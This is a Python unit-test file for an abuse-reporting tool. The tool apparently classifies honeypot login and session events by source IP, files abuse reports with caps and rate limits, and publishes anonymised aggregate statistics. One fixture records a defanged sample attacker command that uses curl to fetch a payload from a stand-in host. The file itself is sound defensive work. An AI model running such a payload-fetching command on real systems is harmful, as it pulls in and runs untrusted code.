from __future__ import annotations

import json
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import abuse_reporter as reporter  # noqa: E402


class ReporterTests(unittest.TestCase):
    def test_public_ip_gate_rejects_non_public_sources(self):
        for value in ("", "not-an-ip", "127.0.0.1", "192.0.0.1", "::1", "169.254.1.1"):
            self.assertFalse(reporter.is_public_ip(value), value)
        self.assertTrue(reporter.is_public_ip("8.8.8.8"))

    def test_classify_requires_threshold_or_payload(self):
        events = [
            {"event": "auth", "src": "8.8.8.8", "ts": f"2026-07-16T00:00:0{i}+00:00"}
            for i in range(4)
        ] + [
            {"event": "session", "src": "1.1.1.1", "ts": "2026-07-16T00:01:00+00:00",
             "cmds": ["curl hxxp://example.invalid/payload"]},
            {"event": "auth", "src": "192.0.0.1", "ts": "2026-07-16T00:02:00+00:00"},
        ]
        candidates = reporter.classify(events, min_auth=5)
        self.assertNotIn("8.8.8.8", candidates)
        self.assertNotIn("192.0.0.1", candidates)
        self.assertEqual(candidates["1.1.1.1"]["categories"], {15, 20, 22})

    def test_auth_threshold_maps_bruteforce_and_ssh(self):
        events = [
            {"event": "auth", "src": "8.8.8.8", "ts": f"2026-07-16T00:00:0{i}+00:00"}
            for i in range(5)
        ]
        candidate = reporter.classify(events)["8.8.8.8"]
        self.assertEqual(candidate["categories"], {18, 22})
        self.assertEqual(candidate["auth"], 5)

    def test_disabled_reporter_does_not_create_state(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            config = self.config(root, enabled=False)
            self.assertEqual(reporter.run_once(config), {"status": "disabled", "filed": 0})
            self.assertFalse(config.private_state_path.exists())
            self.assertFalse(config.public_contribution_path.exists())

    def test_success_persists_dedup_and_public_aggregates(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            config = self.config(root)
            self.write_auth_events(config.events_path, "8.8.8.8", 5)
            calls = []

            def post(_, source, categories):
                calls.append((source, categories))
                return 87

            now = datetime(2026, 7, 16, 8, tzinfo=timezone.utc)
            first = reporter.run_once(config, now=now, post=post, sleep=lambda _: None)
            second = reporter.run_once(
                config, now=now + timedelta(hours=1), post=post, sleep=lambda _: None
            )
            self.assertEqual(first["filed"], 1)
            self.assertEqual(second["filed"], 0)
            self.assertEqual(calls, [("8.8.8.8", {18, 22})])
            private = json.loads(config.private_state_path.read_text())
            public = json.loads(config.public_contribution_path.read_text())
            self.assertIn("8.8.8.8", private)
            self.assertNotIn("8.8.8.8", json.dumps(public))
            self.assertEqual(public["reports"], 1)
            self.assertEqual(public["unique_ips"], 1)
            self.assertEqual(public["avg_confidence"], 87.0)

    def test_daily_cap_and_rate_limit_stop_the_run(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            config = self.config(root, daily_cap=1)
            self.write_auth_events(config.events_path, "8.8.8.8", 5)
            self.write_auth_events(config.events_path, "1.1.1.1", 5, append=True)
            capped = reporter.run_once(
                config, now=datetime(2026, 7, 16, tzinfo=timezone.utc),
                post=lambda *_: 90, sleep=lambda _: None,
            )
            self.assertEqual(capped["filed"], 1)
            self.assertEqual(capped["status"], "daily-cap")

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            config = self.config(root)
            self.write_auth_events(config.events_path, "8.8.8.8", 5)

            def limited(*_):
                raise reporter.RateLimited

            result = reporter.run_once(
                config, now=datetime(2026, 7, 16, tzinfo=timezone.utc),
                post=limited, sleep=lambda _: None,
            )
            self.assertEqual(result["filed"], 0)
            self.assertEqual(result["status"], "rate-limited")

    def test_public_api_attachment_whitelists_and_clamps_fields(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "contrib.json"
            path.write_text(json.dumps({
                "reports": "4", "unique_ips": 3, "avg_confidence": 110,
                "last_ts": "2026-07-16T00:00:00+00:00", "raw_ip": "8.8.8.8",
            }))
            payload = reporter.attach_public_contribution({"stats": {}}, path)
            self.assertEqual(payload["contrib"], {
                "reports": 4, "unique_ips": 3, "avg_confidence": 100.0,
                "last_ts": "2026-07-16T00:00:00+00:00",
            })
            self.assertNotIn("raw_ip", json.dumps(payload))

    @staticmethod
    def config(root: Path, *, enabled=True, daily_cap=200):
        return reporter.Config(
            events_path=root / "events.jsonl",
            private_state_path=root / "private-state.json",
            public_contribution_path=root / "public-contribution.json",
            enabled=enabled,
            api_key="test-key-not-a-secret",
            request_delay=0,
            daily_cap=daily_cap,
        )

    @staticmethod
    def write_auth_events(path: Path, source: str, count: int, *, append=False):
        mode = "a" if append else "w"
        with path.open(mode) as handle:
            for index in range(count):
                handle.write(json.dumps({
                    "event": "auth", "src": source,
                    "ts": f"2026-07-16T00:00:{index:02d}+00:00",
                }) + "\n")


if __name__ == "__main__":
    unittest.main()
